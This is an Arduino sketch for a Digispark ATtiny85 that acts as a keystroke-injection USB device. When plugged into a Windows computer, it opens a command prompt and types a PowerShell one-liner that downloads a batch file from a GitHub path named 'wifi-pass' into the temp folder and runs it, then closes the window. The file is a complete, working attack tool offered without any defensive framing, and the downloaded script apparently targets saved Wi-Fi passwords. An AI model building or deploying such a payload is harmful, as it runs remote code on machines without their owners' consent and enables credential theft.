#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0); // Initialize keyboard
  DigiKeyboard.delay(2000); // Allow system to stabilize

  // Step 1: Open Command Prompt
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows + R
  DigiKeyboard.delay(1000); // Wait for Run dialog to appear
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Press Enter to open CMD
  DigiKeyboard.delay(1500);

  // Step 2: Download and execute the updated trigger.bat
  DigiKeyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/wifi-pass/trigger.bat' -OutFile %temp%\\trigger.bat; Start-Process %temp%\\trigger.bat\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Execute the command
  DigiKeyboard.delay(5000); // Wait for the script to complete

  // Step 3: Close CMD
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Close CMD
}

void loop() {
  // Empty loop - script runs once
}
